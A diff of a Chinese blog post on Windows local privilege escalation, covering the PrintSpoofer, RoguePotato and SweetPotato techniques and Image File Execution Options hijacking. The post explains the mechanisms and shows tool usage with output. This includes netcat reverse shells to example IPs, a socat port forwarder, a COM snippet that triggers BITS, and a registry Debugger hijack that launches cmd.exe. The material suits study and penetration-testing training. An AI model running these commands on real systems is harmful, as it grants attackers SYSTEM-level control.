+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD <span class="hljs-title function_">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-comment">/* [in] */</span> PRINTER_HANDLE hPrinter,</span><br><span class="hljs-params">    <span class="hljs-comment">/* [in] */</span> DWORD fdwFlags,</span><br><span class="hljs-params">    <span class="hljs-comment">/* [in] */</span> DWORD fdwOptions,</span><br><span class="hljs-params">    <span class="hljs-comment">/* [unique][string][in] */</span> <span class="hljs-type">wchar_t</span> *pszLocalMachine,</span><br><span class="hljs-params">    <span class="hljs-comment">/* [in] */</span> DWORD dwPrinterLocal,</span><br><span class="hljs-params">    <span class="hljs-comment">/* [unique][in] */</span> RPC_V2_NOTIFY_OPTIONS *pOptions)</span><br></code></pre></td></tr></table></figure>
+
+<p>其中 pszLocalMachine 参数需要传入 UNC 路径（如 \\目标主机\…）</p>
+<p>当传入 \\127.0.0.1 时，服务会访问 \\127.0.0.1\pipe\spoolss，但该管道已由 SYSTEM 注册<br>当传入 \\127.0.0.1\pipe 时，则会触发路径检查报错<br>若传入 \\127.0.0.1&#x2F;pipe&#x2F;foo，路径检查会将 127.0.0.1&#x2F;pipe&#x2F;foo 视为主机名</p>
+<p>在实际连接时，Windows 会将 <code>/</code> 转换为 <code>\</code>，最终拼接路径为：<code>\\127.0.0.1\pipe\foo\pipe\spoolss</code><br>攻击者就可以注册这个 named pipe 从而窃取 client 的 token</p>
+<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><p>在 Windows 10 和 Server 2016&#x2F;2019 上利用</p>
+<p><strong>1.生成一个交互式的shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\TOOLS&gt;PrintSpoofer.exe -i -c cmd<br>[+] Found privilege: SeImpersonatePrivilege<br>[+] Named pipe listening...<br>[+] CreateProcessAsUser() OK<br>Microsoft Windows [Version 10.0.19613.1000]<br>(c) 2020 Microsoft Corporation. All rights reserved.<br><br>C:\WINDOWS\system32&gt;<span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>
+
+<p><strong>2.生成system的进程并退出</strong></p>
+<p>适用于执行cs的马或者反弹shell的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\TOOLS&gt;PrintSpoofer.exe -c <span class="hljs-string">&quot;C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd&quot;</span><br>[+] Found privilege: SeImpersonatePrivilege<br>[+] Named pipe listening...<br>[+] CreateProcessAsUser() OK<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\TOOLS&gt;nc.exe -l -p 1337<br>Microsoft Windows [Version 10.0.19613.1000]<br>(c) 2020 Microsoft Corporation. All rights reserved.<br><br>C:\WINDOWS\system32&gt;<span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>
+
+<p><strong>3.在桌面上生成system进程</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\TOOLS&gt;qwinsta<br> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE<br> services                                    0  Disc<br> console           Administrator             1  Active<br>&gt;rdp-tcp#3         lab-user                  3  Active<br> rdp-tcp                                 65536  Listen<br><br>C:\TOOLS&gt;PrintSpoofer.exe -d 3 -c <span class="hljs-string">&quot;powershell -ep bypass&quot;</span><br>[+] Found privilege: SeImpersonatePrivilege<br>[+] Named pipe listening...<br>[+] CreateProcessAsUser() OK<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+<h2 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h2><p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
+<p>RoguePotato 可以看作是 Rotten &#x2F; Juicy 的绕过，同时也借鉴了 PrintSpoofer 中的命名管道绕过方式</p>
+<p>微软修补后，高版本 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的 135 端口做流量转发，将其转回受害者本机端口，并写了一个恶意 RPC OXID 解析器</p>
+<p><strong>RPC 协议支持</strong></p>
+<p>根据 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/472083a9-56f1-4d81-a208-d18aef68c101">MS-RPCE 文档</a>，常见 RPC 协议如下：</p>
+<table>
+<thead>
+<tr>
+<th>Transport</th>
+<th>Protocol sequence string</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SMB</td>
+<td>ncacn_np</td>
+</tr>
+<tr>
+<td>TCP&#x2F;IP (IPv4&#x2F;IPv6)</td>
+<td>ncacn_ip_tcp</td>
+</tr>
+<tr>
+<td>UDP</td>
+<td>ncadg_ip_udp</td>
+</tr>
+<tr>
+<td>SPX</td>
+<td>ncacn_spx</td>
+</tr>
+<tr>
+<td>IPX</td>
+<td>ncadg_ipx</td>
+</tr>
+<tr>
+<td>NetBIOS over IPX</td>
+<td>ncacn_nb_ipx</td>
+</tr>
+<tr>
+<td>NetBIOS over TCP</td>
+<td>ncacn_nb_tcp</td>
+</tr>
+<tr>
+<td>NetBIOS over NetBEUI</td>
+<td>ncacn_nb_nb</td>
+</tr>
+<tr>
+<td>AppleTalk</td>
+<td>ncacn_at_dsp</td>
+</tr>
+<tr>
+<td>RPC over HTTP</td>
+<td>ncacn_http</td>
+</tr>
+</tbody></table>
+<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>在最初的尝试中，研究者选择了 TCP 协议 (ncacn_ip_tcp)。恶意 OXID Resolver 在 ResolveOxid2 响应中返回 <code>ncacn_ip_tcp:localhost[9998]</code>，这样可以触发对本地 RPC 服务器 (IRemUnknown2) 的认证请求。不过，这种方式拿到的仅仅是一个 Identification Token，并不能用来完成提权，因此利用价值有限</p>
+<p>随后，研究者借鉴 PrintSpoofer 的思路，尝试通过命名管道 (ncacn_np) 进行利用。如果直接使用 <code>ncacn_np:localhost[\pipe\roguepotato]</code>，协议会强制重定向到 <strong>epmapper</strong> 管道，这样无法达到攻击目的。幸运的是，PrintSpoofer 的研究揭示了命名管道路径校验存在绕过方法：只需在主机名中插入一个 <code>/</code>，路径就会被解析为子目录</p>
+<p>因此，构造了如下结构：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]<br></code></pre></td></tr></table></figure>
+
+<p>这样一来，<code>rpcss</code> 会尝试连接一个并不存在的管道：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">\\.\pipe\roguepotato\pipe\epmapper<br></code></pre></td></tr></table></figure>
+
+<p>攻击者只需在该管道上进行监听，就能调用 <code>RpcImpersonateClient</code>，成功获取 NETWORK SERVICE Token。更进一步，由于 <code>rpcss</code> 与 <code>RpcEptMapper</code> 服务共享进程空间，攻击者还能够窃取其中的 SYSTEM Token，从而实现最终的权限提升</p>
+<h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><p>远程计算机上建立端口转发并监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat tcp-listen:135,reuseaddr,fork tcp:192.168.100.126:9999<br><br>nc -lvvnp 3001<br></code></pre></td></tr></table></figure>
+
+<p>指定远程计算机并执行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">RoguePotato.exe -r 192.168.100.173 -e <span class="hljs-string">&quot;C:\Users\Public\nc64.exe 192.168.100.173 3001 -e cmd.exe&quot;</span> -l 9999 -c &#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h2 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h2><p><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a><br><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p>
+<p>SweetPotato 集成了多种触发 NTLM 认证的方式（COM、WinRM、Spoolsv），相当于 JuicyPotato &#x2F; PrintSpoofer 的集合版，可用于 Windows 7 至 Windows 10 &#x2F; Windows Server 2019 的提权</p>
+<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在 Windows 10 1909 测试中，发现 BITS 服务启动时会尝试向本地 WinRM（5985 端口）发起 NTLM 认证，即使系统默认禁用了 WinRM<br>监听本机 5985 端口可捕获到 NTLM Negotiate 消息，表明 BITS 以 <strong>SYSTEM 身份</strong>发起认证。</p>
+<p>利用思路：通过实现一个伪造的 WinRM 服务端完成 NTLM 的三个Type认证流程</p>
+<p>完成后即可通过 AcceptSecurityContext() 与 QuerySecurityContextToken() 获取 SYSTEM Token，并利用 CreateProcessWithTokenW() 或 CreateProcessAsUser() 提升权限</p>
+<h3 id="BITS-触发方式"><a href="#BITS-触发方式" class="headerlink" title="BITS 触发方式"></a>BITS 触发方式</h3><p>无需复杂的 IStorageInterface 伪造，仅需调用 COM 接口触发 BITS：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">triggerBits</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> status = <span class="hljs-literal">false</span>;<br>    HRESULT result = <span class="hljs-number">-1</span>;<br>    CLSID clsid;<br>    IUnknown* unknown1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">CoInitialize</span>(<span class="hljs-literal">nullptr</span>);<br>    <span class="hljs-built_in">CLSIDFromString</span>(<span class="hljs-built_in">OLESTR</span>(<span class="hljs-string">&quot;&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;&quot;</span>), &amp;clsid);<br>    result = <span class="hljs-built_in">CoCreateInstance</span>(clsid, <span class="hljs-literal">NULL</span>, CLSCTX_LOCAL_SERVER, IID_IUnknown, (<span class="hljs-type">void</span>**)&amp;unknown1);<br>    <span class="hljs-keyword">if</span> (result == S_OK) &#123;<br>        status = <span class="hljs-literal">true</span>;<br>        unknown1-&gt;<span class="hljs-built_in">Release</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CoCreateInstance failed with error 0x%x\n&quot;</span>, result);<br>        status = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-built_in">CoUninitialize</span>();<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意：调用 Release() 至关重要，否则对象引用计数不减少，BITS 服务无法在超时后退出。</p>
+<h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><ul>
+<li>WinRM 必须 <strong>禁用</strong>（Windows 10 默认禁用，但 Windows Server 默认启用）</li>
+<li>需要 Impersonation Privilege（常见于服务账户）</li>
+<li>BITS 必须未运行（否则需等待当前任务结束）</li>
+<li>在部分版本中，BITS 可能尝试访问端口 47001 而非 5985</li>
+</ul>
+<h3 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h3><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-3.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="映像劫持（hijack-Image）"><a href="#映像劫持（hijack-Image）" class="headerlink" title="映像劫持（hijack Image）"></a>映像劫持（hijack Image）</h1><p>在用户尚未登录系统（甚至未输入密码）时，以下这些程序就可以被调用，因此成为了潜在的权限提升入口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">粘滞键： C:\Windows\System32\Sethc.exe<br>屏幕键盘： C:\Windows\System32\osk.exe<br>放大镜： C:\Windows\System32\Magnify.exe<br>旁白： C:\Windows\System32\Narrator.exe<br>显示切换器 C:\Windows\System32\DisplaySwitch.exe<br>应用切换器： C:\Windows\System32\AtBroker.exe<br>Windows + U： C:\Windows\System32\utilman.exe<br></code></pre></td></tr></table></figure>
+
+<p>查看注册表权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">get-acl</span> <span class="hljs-literal">-path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="hljs-built_in">fl</span> *<br></code></pre></td></tr></table></figure>
+
+<p>注意看<code>AccessToString</code>字段</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-14.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果有权限就可以修改注册表，替换文件来提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="krbrelayup提权"><a href="#krbrelayup提权" class="headerlink" title="krbrelayup提权"></a>krbrelayup提权</h1><hr>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7371">Potato家族本地提权细节</a><br><a target="_blank" rel="noopener" href="http://121.89.196.11/index.php/archives/329/">Potato 家族提权学习</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1560/">内网渗透 – NTLM 反射分析及土豆家族</a><br><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM</a><br><a target="_blank" rel="noopener" href="https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/">We thought they were potatoes but they were beans (from Service Account to SYSTEM again)</a></p>
+
+                
+              </div>
             
             <hr/>
             <div>
@@ -469,7 +740,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年8月23日</div>
+          <div>2025年9月5日</div>
         </div>
       
       
@@ -734,23 +1005,6 @@
   
 
 
-
-
-  
-  <script defer>
-    if (document.getElementById('hbePass') || document.querySelector('hbe-prefix')) {
-      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
-        var hbePrefix = document.querySelector('hbe-prefix');
-        hbePrefix.parentElement.classList.add('markdown-body');
-        Fluid.utils.retry(function() {
-          if (Fluid.boot && Fluid.boot.refresh) {
-            Fluid.boot.refresh();
-            return true;
-          }
-        }, 100, 10);
-      })
-    }
-  </script>
 
 
   
